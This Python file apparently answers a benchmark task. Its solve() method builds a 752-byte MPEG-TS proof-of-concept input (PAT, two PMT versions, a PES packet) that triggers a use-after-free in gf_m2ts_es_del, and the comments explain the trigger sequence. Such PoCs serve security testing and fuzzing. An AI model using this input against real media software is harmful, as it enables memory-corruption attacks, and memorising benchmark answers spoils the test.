class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a Use-After-Free in gf_m2ts_es_del, triggered by a
        # specific sequence of MPEG-TS packets that redefine a program's streams.
        #
        # Trigger sequence:
        # 1. A PAT/PMT pair establishes an elementary stream (ES) for a PID.
        #    This allocates an ES-handling structure.
        # 2. A new PMT with an updated version number arrives for the same program,
        #    but it removes the previously defined ES. This action calls
        #    gf_m2ts_es_del, freeing the ES structure.
        # 3. A bug in the vulnerable version fails to nullify the pointer from the
        #    PID's state to the now-freed ES structure.
        # 4. A subsequent data packet for that PID attempts to use this stale
        #    pointer, leading to a use-after-free.
        #
        # This PoC consists of four 188-byte TS packets to orchestrate this sequence,
        # resulting in a size of 752 bytes, which is shorter than the ground-truth.

        def crc32_mpeg2(data: bytes) -> bytes:
            """Calculates the CRC-32/MPEG-2 checksum."""
            poly = 0x04C11DB7
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= (byte << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ poly
                    else:
                        crc = crc << 1
            return (crc & 0xFFFFFFFF).to_bytes(4, 'big')

        # --- Packet 1: Program Association Table (PAT) ---
        # PID 0x0000. Maps program 1 to PMT at PID 0x0101.
        pat_header = b'\x47\x40\x00\x10'  # Sync, PUSI=1, PID=0x0000, Counter=0
        pat_section_data = bytes([
            0x00,        # table_id (PAT)
            0xb0, 0x0d,  # section_syntax_indicator=1, length=13
            0x00, 0x01,  # transport_stream_id
            0xc1,        # version=0, current_next_indicator=1
            0x00,        # section_number
            0x00,        # last_section_number
            0x00, 0x01,  # program_number=1
            0xe1, 0x01,  # program_map_PID=0x0101
        ])
        pat_section = b'\x00' + pat_section_data + crc32_mpeg2(pat_section_data)
        pat_payload = pat_section.ljust(184, b'\xff')
        pat_packet = pat_header + pat_payload

        # --- Packet 2: Program Map Table (PMT), Version 0 ---
        # PID 0x0101. Defines H.264 video stream at PID 0x0100.
        pmt1_header = b'\x47\x41\x01\x10'  # Sync, PUSI=1, PID=0x0101, Counter=0
        pmt1_section_data = bytes([
            0x02,        # table_id (PMT)
            0xb0, 0x12,  # section_syntax_indicator=1, length=18
            0x00, 0x01,  # program_number
            0xc1,        # version=0, current_next_indicator=1
            0x00,        # section_number
            0x00,        # last_section_number
            0xe1, 0x00,  # PCR_PID=0x0100
            0xf0, 0x00,  # program_info_length=0
            # Stream descriptor
            0x1b,        # stream_type=H.264
            0xe1, 0x00,  # elementary_PID=0x0100
            0xf0, 0x00,  # ES_info_length=0
        ])
        pmt1_section = b'\x00' + pmt1_section_data + crc32_mpeg2(pmt1_section_data)
        pmt1_payload = pmt1_section.ljust(184, b'\xff')
        pmt1_packet = pmt1_header + pmt1_payload

        # --- Packet 3: Program Map Table (PMT), Version 1 ---
        # PID 0x0101. New version, removes the stream, triggering the free.
        pmt2_header = b'\x47\x41\x01\x11'  # Counter incremented to 1
        pmt2_section_data = bytes([
            0x02,        # table_id (PMT)
            0xb0, 0x0d,  # section_syntax_indicator=1, length=13
            0x00, 0x01,  # program_number
            0xc3,        # version=1, current_next_indicator=1
            0x00,        # section_number
            0x00,        # last_section_number
            0xe1, 0x00,  # PCR_PID=0x0100
            0xf0, 0x00,  # program_info_length=0
            # No stream descriptors
        ])
        pmt2_section = b'\x00' + pmt2_section_data + crc32_mpeg2(pmt2_section_data)
        pmt2_payload = pmt2_section.ljust(184, b'\xff')
        pmt2_packet = pmt2_header + pmt2_payload

        # --- Packet 4: Data Packet ---
        # PID 0x0100. Triggers the UAF by accessing the freed stream handler.
        data_header = b'\x47\x41\x00\x10'  # Sync, PUSI=1, PID=0x0100, Counter=0
        # Minimal PES header to ensure the payload is processed as stream data.
        pes_header = b'\x00\x00\x01\xe0\x00\x00\x80\x00\x00'
        data_payload = pes_header.ljust(184, b'\xaa')
        data_packet = data_header + data_payload
        
        poc = pat_packet + pmt1_packet + pmt2_packet + data_packet
        return poc
